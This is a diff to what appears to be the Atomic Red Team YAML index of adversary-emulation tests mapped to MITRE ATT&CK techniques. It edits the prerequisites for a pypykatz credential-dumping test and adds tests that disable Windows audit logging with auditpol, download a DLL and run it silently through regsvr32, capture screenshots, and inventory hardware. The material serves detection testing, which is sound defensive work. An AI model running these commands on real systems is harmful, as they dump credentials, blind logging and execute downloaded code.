@@ -20466,33 +20466,33 @@ credential-access:
         Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
       supported_platforms:
       - windows
-      dependency_executor_name: powershell
+      dependency_executor_name: command_prompt
       dependencies:
       - description: 'Computer must have python 3 installed
 
 '
-        prereq_command: 'if (python --version) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "Python 3 must be installed manually"
 
 '
       - description: 'Computer must have pip installed
 
 '
-        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 -m pip --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "PIP must be installed manually"
 
 '
       - description: 'pypykatz must be installed and part of PATH
 
 '
-        prereq_command: 'if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: 'pip3 install pypykatz
+        prereq_command: |
+          pypykatz -h >nul 2>&1
+          exit /b %errorlevel%
+        get_prereq_command: 'pip install pypykatz
 
 '
       executor:
@@ -22268,33 +22268,33 @@ credential-access:
 '
       supported_platforms:
       - windows
-      dependency_executor_name: powershell
+      dependency_executor_name: command_prompt
       dependencies:
       - description: 'Computer must have python 3 installed
 
 '
-        prereq_command: 'if (python --version) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "Python 3 must be installed manually"
 
 '
       - description: 'Computer must have pip installed
 
 '
-        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 -m pip --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "PIP must be installed manually"
 
 '
       - description: 'pypykatz must be installed and part of PATH
 
 '
-        prereq_command: 'if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: 'pip3 install pypykatz
+        prereq_command: |
+          pypykatz -h >nul 2>&1
+          exit /b %errorlevel%
+        get_prereq_command: 'pip install pypykatz
 
 '
       executor:
@@ -25401,6 +25401,26 @@ collection:
           description: Output file path
           type: Path
           default: "/tmp/T1113_desktop.xwd"
+        package_checker:
+          description: Package checking command for linux. Debian system command-
+            dpkg -s x11-apps
+          type: string
+          default: rpm -q xorg-x11-apps
+        package_installer:
+          description: Package installer command for linux. Debian system command-
+            apt-get install x11-apps
+          type: string
+          default: yum install -y xorg-x11-apps
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Package with XWD and XWUD must exist on device
+
+'
+        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
+          1; fi
+
+'
+        get_prereq_command: "sudo #{package_installer} \n"
       executor:
         command: |
           xwd -root -out #{output_file}
@@ -25465,7 +25485,9 @@ collection:
           Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
           [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
           cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
-        cleanup_command: 'rm #{output_file} -ErrorAction Ignore'
+        cleanup_command: 'rm #{output_file} -ErrorAction Ignore
+
+'
   T1213.002:
     technique:
       external_references:
@@ -28884,6 +28906,24 @@ defense-evasion:
         cleanup_command: Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS"
           -fore red
         name: powershell
+        elevation_required: true
+    - name: Impair Windows Audit Log Policy
+      auto_generated_guid: 5102a3a7-e2d7-4129-9e45-f483f2e0eea8
+      description: |-
+        Disables the windows audit policy to prevent key host based telemetry being written into the event logs.
+        [Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          auditpol /set /category:"Account Logon" /success:disable /failure:disable
+          auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+          auditpol /set /category:"Detailed Tracking" /success:disable
+        cleanup_command: |
+          auditpol /set /category:"Account Logon" /success:enable /failure:enable
+          auditpol /set /category:"Detailed Tracking" /success:enable
+          auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+        name: command_prompt
         elevation_required: true
   T1562.007:
     technique:
@@ -32315,7 +32355,7 @@ defense-evasion:
           Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
       executor:
-        command: 'certutil -addstore my .\test-cert.cer
+        command: 'certutil -addstore my #{pfx_path}
 
 '
         cleanup_command: |
@@ -37832,6 +37872,37 @@ defense-evasion:
         elevation_required: false
         command: "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n"
         cleanup_command: "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
+    - name: Regsvr32 Silent DLL Install Call DllRegisterServer
+      auto_generated_guid: 9d71c492-ea2e-4c08-af16-c6994cdf029f
+      description: Regsvr32.exe is a command-line program used to register and unregister
+        OLE controls. Normally, an install is executed with /n to prevent calling
+        DllRegisterServer.
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_name:
+          description: Name of DLL to Install
+          type: String
+          default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: String
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: AllTheThingsx86.dll must exist on disk at specified location
+          (#{dll_name})
+        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+      executor:
+        command: "#{regsvr32path}\\#{regsvr32name} /s /i #{dll_name}"
+        name: command_prompt
   T1036.003:
     technique:
       external_references:
@@ -46940,7 +47011,20 @@ discovery:
       - Process monitoring
       - Process command-line parameters
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1120
+    atomic_tests:
+    - name: Win32_PnPEntity Hardware Inventory
+      auto_generated_guid: 2cb4dbf2-2dca-4597-8678-4d39d207a3a5
+      description: Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
+          $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
+          @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
+        cleanup_command: Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore
+        name: powershell
   T1069:
     technique:
       id: attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce
